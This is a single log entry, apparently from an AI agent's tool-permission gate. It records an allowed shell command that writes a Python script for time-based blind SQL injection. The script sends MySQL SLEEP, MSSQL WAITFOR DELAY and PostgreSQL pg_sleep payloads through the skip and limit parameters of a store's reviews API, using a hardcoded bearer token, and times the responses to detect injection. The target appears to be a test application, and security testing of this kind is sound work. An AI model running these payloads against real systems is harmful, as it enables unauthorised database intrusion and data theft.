{"ts": 1790649578.9229522, "decision_id": "a696bb9e512b", "tool": "run_shell", "allow": true, "reason": null, "target": "cat > /work/test_time_sqli.py << 'PYEOF'\nimport requests\nimport time\nimport json\n\ntoken = \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNDA4YTFhNzMtYzU2YS00NmVjLTlmMGQtNDRhNDViM2M1MzUxIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcl9zcWxtYXAiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY1MDgyM30.9ze9AipKZPtkQe1vAor4bY2QC5T6880-m1Fs9f6Vvug\"\nheaders = {\"Authorization\": \"Bearer \" + token, \"Content-Type\": \"application/json\"}\n\nurl = \"https://duck-store.escape.tech/api/v1/reviews/product/1\"\n\n# Time-based payloads\npayloads = [\n    (\"10\", \"normal\"),\n    (\"10 AND SLEEP(5)\", \"mysql_sleep\"),\n    (\"10 AND (SELECT * FROM (SELECT(SLEEP(5)))a)\", \"mysql_subquery\"),\n    (\"10; WAITFOR DELAY '0:0:5'--\", \"mssql_wait\"),\n    (\"10 AND pg_sleep(5)--\", \"pg_sleep\"),\n    (\"0\", \"normal_skip\"),\n    (\"0 AND SLEEP(5)\", \"mysql_sleep_skip\"),\n    (\"0 AND (SELECT * FROM (SELECT(SLEEP(5)))a)\", \"mysql_subquery_skip\"),\n    (\"0; WAITFOR DELAY '0:0:5'--\", \"mssql_wait_skip\"),\n    (\"0 AND pg_sleep(5)--\", \"pg_sleep_skip\"),\n]\n\nfor payload, name in payloads:\n    params = {\"skip\": 0, \"limit\": payload}\n    if \"skip\" in name:\n        params = {\"skip\": payload, \"limit\": 10}\n    start = time.time()\n    try:\n        r = requests.get(url, params=params, headers=headers, timeout=15)\n        elapsed = time.time() - start\n        print(f\"{name}: limit={payload[:40]}... Status={r.status_code}, Time={elapsed:.2f}s, Len={len(r.text)}\")\n    except requests.exceptions.Timeout:\n        elapsed = time.time() - start\n        print(f\"{name}: limit={payload[:40]}... TIMEOUT after {elapsed:.2f}s\")\n    except Exception as e:\n        elapsed = time.time() - start\n        print(f\"{name}: limit={payload[:40]}... Error={e}, Time={elapsed:.2f}s\")\nPYEOF"}
